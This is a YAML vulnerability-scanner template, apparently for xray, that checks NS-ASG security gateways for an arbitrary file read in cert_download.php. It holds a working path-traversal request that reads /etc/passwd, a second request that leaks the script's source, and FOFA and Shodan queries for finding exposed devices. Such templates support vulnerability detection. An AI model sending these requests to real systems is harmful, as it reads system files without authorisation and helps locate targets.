expression: r0() || r1()
id: ns-asg-file-read
info:
  author: pikpikcu,ritikchaddha
  description: "fofa-query: app=\"\u7F51\u5EB7\u79D1\u6280-NS-ASG\u5B89\u5168\u7F51\
    \u5173\"\nshodan-query: http.title:\u201CNS-ASG\u201D\n"
  name: NS ASG Arbitrary File Read
  reference:
  - https://zhuanlan.zhihu.com/p/368054963
  - "http://wiki.xypbk.com/Web\u5B89\u5168/\u7F51\u5EB7%20NS-ASG\u5B89\u5168\u7F51\
    \u5173/\u7F51\u5EB7%20NS-ASG\u5B89\u5168\u7F51\u5173%20\u4EFB\u610F\u6587\u4EF6\
    \u8BFB\u53D6\u6F0F\u6D1E.md"
  severity: high
rules:
  r0:
    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      method: GET
      path: /admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd
  r1:
    expression: response.status == 200 && response.body.bcontains(b"$certfile") &&
      response.body.bcontains(b"application/pdf")
    request:
      method: GET
      path: /admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php
